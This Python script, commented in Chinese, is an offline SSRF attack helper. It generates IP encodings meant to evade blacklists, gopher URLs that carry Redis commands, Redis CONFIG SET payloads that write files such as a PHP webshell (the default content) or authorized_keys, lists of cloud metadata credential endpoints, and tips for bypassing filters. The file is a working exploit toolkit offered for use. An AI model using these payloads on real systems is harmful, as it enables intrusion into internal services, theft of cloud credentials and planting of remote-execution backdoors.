#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SSRF 辅助（离线）：IP 变形绕过 / gopher-RESP 构造 / 云元数据清单 / 探测矩阵 / 屏蔽词检查。

纯标准库、离线：只生成字符串与清单，不发包。
"""
import argparse
import ipaddress
import sys
import urllib.parse

CLOUD_META = {
    "aws": [("根", "http://169.254.169.254/latest/meta-data/"),
            ("凭据", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
            ("用户数据", "http://169.254.169.254/latest/user-data")],
    "gcp": [("根", "http://metadata.google.internal/computeMetadata/v1/"),
            ("token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")],
    "aliyun": [("根", "http://100.100.100.200/latest/meta-data/"),
               ("凭据", "http://100.100.100.200/latest/meta-data/ram/security-credentials/")],
    "azure": [("根", "http://169.254.169.254/metadata/instance?api-version=2021-02-01")],
    "tencent": [("根", "http://metadata.tencentyun.com/latest/meta-data/")],
}
COMMON_PORTS = [(6379, "redis"), (3306, "mysql"), (9000, "php-fpm"), (11211, "memcached"),
                (9200, "elasticsearch"), (2375, "docker"), (8080, "http-alt"), (80, "http"),
                (5432, "postgres"), (27017, "mongodb")]
BLOCK_TOKENS = ("127.0.0.1", "localhost", "0.0.0.0", "169.254.169.254", "gopher", "dict", "file",
                "127.0.0.", "internal", "metadata")
REDIS_FILE_TEMPLATE = [
    "CONFIG SET dir {dir}",
    "CONFIG SET dbfilename {name}",
    "SET x \"{content}\"",
    "SAVE",
]


class SsrfError(ValueError):
    pass


def ip_variants(ip="127.0.0.1"):
    """同一地址的多种写法，用于绕过字符串黑名单。"""
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        raise SsrfError("不是合法 IP：%r" % (ip,))
    if addr.version != 4:
        return ["[%s]" % ip, ip, ip.replace(":", "-") + ".sslip.io"]
    n = int(addr)
    out = [
        ip,
        str(n),                                   # 十进制整数 2130706433
        "0x%x" % n,                               # 0x7f000001
        "0%o" % n if n < 8 ** 11 else "",         # 八进制（超长直接丢弃）
        "%d.%d.%d" % ((n >> 24) & 0xFF, (n >> 16) & 0xFF, n & 0xFFFF),   # 127.0.1 简写
        "%d.%d" % ((n >> 24) & 0xFF, n & 0xFFFFFF),                       # 127.1
        str(n >> 24) + ".0x%x.0x%x" % ((n >> 16) & 0xFF, n & 0xFFFF),
        "::ffff:%s" % ip,                         # IPv6 映射
        "[::1]",
        "localhost",
        ip + ".nip.io",
        ip + ".sslip.io",
        "spoofed." + ip + ".example.com",
    ]
    seen, res = set(), []
    for v in out:
        if v and v not in seen:
            seen.add(v)
            res.append(v)
    return res


def resp_cmd(*cmds):
    """Redis 命令 → RESP 字节串。cmds 元素可为 str（按空格切）或 list。"""
    if not cmds:
        raise SsrfError("至少给一条 Redis 命令")
    out = b""
    for c in cmds:
        parts = c if isinstance(c, (list, tuple)) else str(c).split()
        if not parts:
            raise SsrfError("空命令")
        out += ("*%d\r\n" % len(parts)).encode()
        for p in parts:
            pb = p.encode("utf-8") if not isinstance(p, bytes) else p
            out += ("$%d\r\n" % len(pb)).encode() + pb + b"\r\n"
    return out


def gopher_url(payload, host="127.0.0.1", port=6379):
    """RESP 字节 → gopher URL（注意 gopher 必须带 `/_` 前缀，换行需编码）。"""
    if isinstance(payload, str):
        payload = payload.encode("utf-8")
    if not payload:
        raise SsrfError("payload 为空")
    if not (0 < port < 65536):
        raise SsrfError("端口不合法：%r" % (port,))
    return "gopher://%s:%d/_%s" % (host, port, urllib.parse.quote(payload, safe=""))


def redis_file_url(path, content, host="127.0.0.1", port=6379):
    """用 CONFIG SET 写任意文件（webshell / authorized_keys / crontab）。"""
    if not path.startswith("/"):
        raise SsrfError("目标路径必须是绝对路径：%r" % (path,))
    d, name = path.rsplit("/", 1)
    if not name:
        raise SsrfError("目标路径缺文件名：%r" % (path,))
    cmds = [t.format(dir=d or "/", name=name, content=content) for t in REDIS_FILE_TEMPLATE]
    return gopher_url(resp_cmd(*cmds), host, port)


def metadata_list(provider="all"):
    provider = (provider or "all").lower()
    if provider != "all" and provider not in CLOUD_META:
        raise SsrfError("未知云厂商 %r（可选 %s）" % (provider, "/".join(CLOUD_META) + "/all"))
    keys = list(CLOUD_META) if provider == "all" else [provider]
    return [(p, n, u) for p in keys for n, u in CLOUD_META[p]]


def probe_list(host="127.0.0.1", ports=None):
    """端口×协议 探测矩阵。"""
    ports = ports or [p for p, _n in COMMON_PORTS]
    name_of = dict(COMMON_PORTS)
    out = []
    for p in ports:
        out.append((name_of.get(p, "?"), "http://%s:%d/" % (host, p)))
        if p == 6379:
            out.append(("redis-dict", "dict://%s:%d/info" % (host, p)))
    return out


def check_blocked(text):
    """检查 payload 里会命中的黑名单词，并给出可替换的绕过写法。"""
    low = text.lower()
    hits = [t for t in BLOCK_TOKENS if t in low]
    tips = []
    for h in hits:
        if h in ("127.0.0.1", "localhost", "127.0.0."):
            tips.append("%s 被拦：换 2130706433 / 0x7f000001 / 127.1 / [::1] / 127.0.0.1.nip.io" % h)
        if h == "169.254.169.254":
            tips.append("元数据地址被拦：换 302 跳转或 DNS 解析到该地址的域名")
        if h in ("gopher", "dict", "file"):
            tips.append("%s 协议名被拦：试大写/URL 编码/302 跳转，或改用 http 打内网应用" % h)
    return {"hits": hits, "tips": tips}


def selftest():
    fails = []

    # 1. 正常路径：IP 变形
    vs = ip_variants("127.0.0.1")
    for want in ("2130706433", "0x7f000001", "127.1", "[::1]", "localhost"):
        if want not in vs:
            fails.append("case1: 缺变形 %s -> %r" % (want, vs))
    if len(set(vs)) != len(vs):
        fails.append("case1b: 变形重复")
    if ip_variants("10.0.0.5")[1] != "167772165":
        fails.append("case1c: 十进制变形算错 %r" % (ip_variants("10.0.0.5")[:2],))

    # 2. 正常路径：RESP 与 gopher 编码
    raw = resp_cmd(["SET", "x", "abc"])
    if raw != b"*3\r\n$3\r\nSET\r\n$1\r\nx\r\n$3\r\nabc\r\n":
        fails.append("case2: RESP 编码错 %r" % (raw,))
    url = gopher_url(raw)
    if not url.startswith("gopher://127.0.0.1:6379/_") or "%0D%0A" not in url:
        fails.append("case2b: gopher URL 缺 /_ 前缀或未编码换行 %r" % (url,))
    if "\r" in url or "\n" in url:
        fails.append("case2c: URL 里残留裸 \r\n")
    if urllib.parse.unquote(url.split("_", 1)[1]).encode("latin-1") != raw:
        fails.append("case2d: 编码不可逆")
    one = gopher_url(resp_cmd("PING"))
    if one != "gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0APING%0D%0A":
        fails.append("case2e: 单条命令 URL 不符 %r" % (one,))

    # 3. 正常路径：写文件模板与云元数据清单
    w = redis_file_url("/var/www/html/shell.php", "<?php system($_GET[c]); ?>")
    plain = urllib.parse.unquote(w.split("_", 1)[1])
    if "CONFIG" not in plain or "SET" not in plain or "dir" not in plain \
            or "/var/www/html" not in plain or "dbfilename" not in plain or "shell.php" not in plain:
        fails.append("case3: 写文件命令不全 %r" % (plain[:120],))
    if plain.count("SAVE") != 1:
        fails.append("case3b: 缺 SAVE 或重复")
    meta = metadata_list("aws")
    if not meta or "169.254.169.254" not in meta[0][2]:
        fails.append("case3c: AWS 元数据清单错 %r" % (meta,))
    if len({p for p, _n, _u in metadata_list("all")}) != len(CLOUD_META):
        fails.append("case3d: all 未覆盖全部厂商")

    # 4. 边界：黑名单检查与探测矩阵
    r = check_blocked("http://127.0.0.1:6379/")
    if "127.0.0.1" not in r["hits"] or not any("2130706433" in t for t in r["tips"]):
        fails.append("case4: 黑名单提示缺失 %r" % (r,))
    g = check_blocked("gopher://127.0.0.1:6379/_x")
    if "gopher" not in g["hits"]:
        fails.append("case4b: 未识别 gopher")
    pl = probe_list("10.0.0.1", [6379, 80])
    if pl[0][1] != "http://10.0.0.1:6379/" or not any(n == "redis-dict" for n, _u in pl):
        fails.append("case4c: 探测矩阵错 %r" % (pl,))
    if check_blocked("http://example.com/ok")["hits"]:
        fails.append("case4d: 无黑名单词时误报")

    # 5. 边界拒绝
    bad = [
        ("非法 IP", lambda: ip_variants("300.1.1.1")),
        ("空命令", lambda: resp_cmd()),
        ("空 payload", lambda: gopher_url(b"")),
        ("端口越界", lambda: gopher_url(b"x", port=70000)),
        ("相对路径", lambda: redis_file_url("shell.php", "x")),
        ("未知厂商", lambda: metadata_list("oracle-cloud")),
    ]
    for name, fn in bad:
        try:
            fn()
            fails.append("case5: %s 未被拒绝" % name)
        except SsrfError:
            pass

    # 6. 参数不足
    tiny = argparse.ArgumentParser(prog="ssrf_internal", add_help=False)
    tiny.exit = lambda status=0, message=None: (_ for _ in ()).throw(SystemExit(status))
    tiny._print_message = lambda message, file=None: None
    tiny.add_argument("--x")
    try:
        tiny.error("需要 --ip/--redis/--meta/--probe/--check；或用 --selftest")
        fails.append("case6: ap.error 未抛 SystemExit")
    except SystemExit as e:
        if e.code != 2:
            fails.append("case6: 退出码 %r" % (e.code,))

    for f in fails:
        print("FAIL %s" % f, file=sys.stderr)
    if fails:
        return 1
    print("selftest ok: 6/6（IP变形、RESP与gopher编码、写文件与元数据、黑名单与探测、坏输入拒绝、参数不足）")
    return 0


def main(argv=None):
    ap = argparse.ArgumentParser(description="SSRF 辅助：IP 变形 / gopher-RESP / 云元数据 / 探测矩阵（离线）")
    ap.add_argument("--ip", metavar="ADDR", nargs="?", const="127.0.0.1", default=None,
                    help="生成 IP 变形写法（默认 127.0.0.1）")
    ap.add_argument("--redis", metavar="CMD", nargs="+", default=None,
                    help="把 Redis 命令转成 gopher URL，如 --redis 'CONFIG GET dir'")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=6379)
    ap.add_argument("--write", metavar="PATH", default=None, help="生成写文件 gopher URL（配合 --content）")
    ap.add_argument("--content", default="<?php system($_GET[c]); ?>")
    ap.add_argument("--meta", nargs="?", const="all", default=None, choices=list(CLOUD_META) + ["all"],
                    help="云元数据端点清单")
    ap.add_argument("--probe", metavar="HOST", nargs="?", const="127.0.0.1", default=None,
                    help="输出端口×协议探测矩阵")
    ap.add_argument("--check", metavar="PAYLOAD", default=None, help="检查黑名单命中并给绕过写法")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)

    if args.selftest:
        return selftest()
    try:
        if args.meta is not None:
            for p, n, u in metadata_list(args.meta):
                print("%-9s %-8s %s" % (p, n, u))
            return 0
        if args.probe is not None:
            for n, u in probe_list(args.probe):
                print("%-12s %s" % (n, u))
            return 0
        if args.check is not None:
            r = check_blocked(args.check)
            print("[*] 命中：%s" % (", ".join(r["hits"]) or "无"))
            for t in r["tips"]:
                print("    - %s" % t)
            return 0
        if args.write is not None:
            print(redis_file_url(args.write, args.content, args.host, args.port))
            return 0
        if args.redis:
            print(gopher_url(resp_cmd(*args.redis), args.host, args.port))
            return 0
        if args.ip is not None:
            for v in ip_variants(args.ip):
                print(v)
            return 0
        ap.error("需要 --ip/--redis/--write/--meta/--probe/--check；或用 --selftest")
        return 2
    except SsrfError as e:
        print("错误：%s" % e, file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main())
